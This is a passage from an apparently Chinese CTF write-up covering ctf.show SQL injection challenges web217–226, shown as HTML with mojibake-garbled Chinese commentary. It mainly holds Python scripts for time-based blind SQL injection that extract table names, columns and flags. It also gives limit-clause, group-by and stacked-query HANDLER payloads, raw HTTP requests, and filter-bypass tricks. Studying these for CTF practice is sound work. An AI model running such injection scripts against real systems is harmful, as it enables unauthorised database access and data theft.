class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡benchmarkæ¥å®ç°sleepçš„å¹³æ›¿ï¼Œmysqlä¸­trueä¸º1ï¼Œfalseä¸º0ï¼Œæˆ‘ä»¬å¯ä»¥ä¹˜ä¸€ä¸ªå¤§æ•°æ¥è¿›è¡Œbenchmark</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/7 15:13</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4e8f7ce0-ca2c-4556-a84d-4a0172160a7a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxccb&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select flagaabc from `ctfshow_flagxccb`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;-1) or benchmark(4e6*(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),sha1(&#x27;disda&#x27;))#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web218">web218</span></h4><p>è¿™é“é¢˜banäº†<code>sleep</code>å’Œ<code>benchmark</code></p><p>æˆ‘ä»¬ä½¿ç”¨ç¬›å¡å°”ç§¯å¹³æ›¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d3acf855-ded7-4f06-9fe8-d6c38215602b.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å  </span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line"><span class="comment">#218</span></span><br><span class="line"><span class="comment">#payload = &quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line"><span class="comment">#219</span></span><br><span class="line"><span class="comment">#payload = &quot;select flagaabc from ctfshow_flagxca&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;-1) or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.schemata C),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web220">web220</span></h4><p>asciiå¯ä»¥ç”¨ordåŒåå‡½æ•°æ›¿æ¢,substrå¯ä»¥ç”¨rightæ›¿æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d9c4aa97-33ea-4164-abc7-79b0c50fe9ce.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å  </span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxcac&#x27;&quot;</span></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select flagaabcc from ctfshow_flagxcac&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> : <span class="string">f&quot;-1) or if(ord(right((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.schemata C),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç­”æ¡ˆ<code>&#125;2c15ff03675d-2cc9-fd04-a628-8c62925d&#123;wohsftc</code></p><p>éœ€è¦reverseä¸€ä¸‹ã€‚</p><h4><span id="web221">web221</span></h4><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">limitæ³¨å…¥</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>)</span><br><span class="line"><span class="number">10</span> procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4><span id="web222">web222</span></h4><p>groupæ³¨å…¥ æˆ‘ä»¬å¯ä»¥è¿›è¡Œå»¶æ—¶ç›²æ³¨ä¹Ÿå¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨</p><p>æˆ‘è¿™é‡Œç”¨å»¶æ—¶ç›²æ³¨</p><p>ä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group by if(1=1,sleep(1),1)</span><br></pre></td></tr></table></figure><blockquote><p>ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œgroup byä¼šå‘ä¸‹ä¸€ç›´æŸ¥è¯¢ï¼Œæ•°æ®åº“é‡Œæ€»å…±æœ‰21æ¡æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯sleep(1)åˆ™æ˜¯åœé¡¿21ç§’</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/9 14:54</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f3a56ce4-76ff-448d-8baa-2ebba20cf55f.challenge.ctf.show/api/?u=&quot;</span></span><br><span class="line">url2 = <span class="string">&#x27; &amp;page=1&amp;limit=10&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†åˆ—</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†å€¼</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url+payload+url2,timeout=<span class="number">1</span>).text</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4><span id="web223">web223</span></h4><blockquote><p>numToStr å‡½æ•°æ˜¯ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œç”¨äºå°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸º SQL æŸ¥è¯¢è¯­å¥ä¸­çš„è¡¨è¾¾å¼ã€‚</p><p>è¯¥å‡½æ•°çš„åŸºæœ¬æ€æƒ³æ˜¯å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸º true å€¼çš„åˆ—è¡¨ï¼Œè¿™ä¸ªåˆ—è¡¨çš„é•¿åº¦ä¸ºè¯¥å­—ç¬¦çš„ ASCII ç å€¼ã€‚ç„¶åå°†è¿™ä¸ª true å€¼çš„åˆ—è¡¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™ char() å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°† true å€¼è½¬æ¢ä¸ºå¯¹åº”çš„ ASCII å­—ç¬¦ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥å­—ç¬¦ä¸²æ˜¯ â€œaâ€ï¼Œåˆ™ numToStr(â€œaâ€) çš„ç»“æœæ˜¯ â€œchar(true,true,â€¦true)â€ï¼Œå…¶ä¸­ true çš„æ•°é‡ä¸º ASCII ç å€¼ â€œaâ€ çš„å€¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒASCII ç å€¼ â€œaâ€ çš„å€¼ä¸º 97ï¼Œå› æ­¤åˆ—è¡¨ä¸­æœ‰ 97 ä¸ª true å€¼ã€‚</p><p>è¿™ç§æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯å¯ä»¥é¿å…ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥æé«˜æŸ¥è¯¢æ€§èƒ½ã€‚æ­¤å¤–ï¼Œä½¿ç”¨ true å€¼çš„åˆ—è¡¨ä¹Ÿé¿å…äº†å­—ç¬¦ä¸²è½¬ä¹‰çš„é—®é¢˜ã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒnumToStr å‡½æ•°æä¾›äº†ä¸€ä¸ªç®€å•è€Œæœ‰æ•ˆçš„æ–¹æ³•ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸º SQL æŸ¥è¯¢è¯­å¥ä¸­çš„è¡¨è¾¾å¼ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/6/9 16:17</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a3d2e7a1-9073-4c14-a573-4e6ae2ea9e11.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2true</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;true%2b&#x27;</span> * (num-<span class="number">1</span>) + <span class="string">&#x27;true)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    head,tail = <span class="number">32</span>, <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail+<span class="number">1</span>) &gt;&gt; <span class="number">1</span>  <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(mid)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†åˆ—</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(mid)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># çˆ†å€¼</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(mid)&#125;,username,true)&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url+payload).text</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            tail = mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = mid</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web225">web225</span></h4><p><a href="https://www.freesion.com/article/79341469067/">ç”¨handleræ›¿ä»£select</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=&#x27;;show tables;%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">?username=&#x27;;handler `ctfshow_flagasa` open as hd;handler hd read first;%<span class="number">23</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET /api/?username=&#x27;;show%20tables;--+ HTTP/1.1</span><br><span class="line">Host: 1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show/other.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=9oqrd401j58f8c21c1gge7p3gd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">GET /api/?username=&#x27;;handler%20%60ctfshow_flagasa%60%20open%20as%20hd;handler%20hd%20read%20first;%2523 HTTP/1.1</span><br><span class="line">Host: 1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://1a001d3e-f735-4f37-aa7a-f1d7bcfabb8c.challenge.ctf.show/other.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=9oqrd401j58f8c21c1gge7p3gd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web226">web226</span></h4><p>é¢„ç¼–è¯‘</p><blockquote><p>prepareç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥<br>executeæ‰§è¡Œè¯­å¥<br>(deallocate|drop) prepare nameç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥(ä¹Ÿå¯ä»¥ä¸åŠ )</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27; ç­‰ä»·äºunhex(hex(6e6+382179)); å¯ä»¥ç”¨äºç»•è¿‡å¤§æ•°è¿‡æ»¤ï¼ˆå¤§æ•°è¿‡æ»¤ï¼š/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/iï¼‰</span><br><span class="line">å…·ä½“è½¬æ¢çš„æ­¥éª¤æ˜¯ï¼š</span><br><span class="line">  1. abcè½¬æˆ16è¿›åˆ¶æ˜¯616263</span><br><span class="line">  2. 616263è½¬åè¿›åˆ¶æ˜¯6382179</span><br><span class="line">  3. ç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤º6e6+382179 </span><br><span class="line">  4. å¥—ä¸Šunhex(hex())ï¼Œå°±æ˜¯unhex(hex(6e6+382179));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 